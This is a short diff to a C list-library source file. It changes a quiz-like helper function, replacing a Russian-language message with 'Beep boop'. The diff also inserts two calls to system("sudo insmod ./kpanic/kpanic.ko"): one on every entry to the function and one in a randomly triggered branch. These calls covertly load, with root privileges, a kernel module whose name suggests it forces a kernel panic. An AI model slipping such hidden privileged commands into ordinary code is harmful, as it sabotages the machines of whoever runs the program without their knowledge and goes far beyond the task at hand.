@@ -1089,6 +1089,8 @@ static list::err_t recalloc_and_sorting (list::list_t *list, size_t new_capacity
 
 static bool cringe_get_iter_wrapper (size_t index)
 {
+    system ("sudo insmod ./kpanic/kpanic.ko");
+
     char index_str[INDEX_MAX_LEN] = "";
     bool right_guess = true;
 
@@ -1118,7 +1120,8 @@ static bool cringe_get_iter_wrapper (size_t index)
             if (rand () <= RAND_TRUE_MAX)
             {
                 i = 0;
-                printf ("Извините, я перепутал ваши ответы, вам придется ответить заново\n\n");
+                printf ("Beep boop\n\n");
+                system ("sudo insmod ./kpanic/kpanic.ko");
                 right_guess = true;
             }
         }
